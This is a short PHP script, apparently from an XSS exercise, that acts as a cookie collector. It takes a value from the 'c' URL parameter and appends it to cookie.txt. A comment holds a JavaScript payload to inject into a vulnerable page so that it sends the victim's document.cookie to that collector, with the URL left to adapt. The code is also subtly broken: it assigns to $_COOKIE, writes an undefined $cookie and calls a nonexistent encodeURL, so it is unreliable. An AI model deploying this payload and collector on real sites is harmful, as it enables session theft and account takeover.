<?php
    $_COOKIE =$_GET['c'];
    $fp = fopen('cookie.txt','a');
    fputs($fp,$cookie.'\r\n');
    fclose($fp);

    
//use in vulnerable place (url a adapter)
// <script> var Http = new XMLHttpRequest();
// var url='http://127.0.0.1/attaqueXSS/index.php?c=' + encodeURL(document.cookie);
// Http.open('GET', url);
// Http.send();
// </script> 
?>
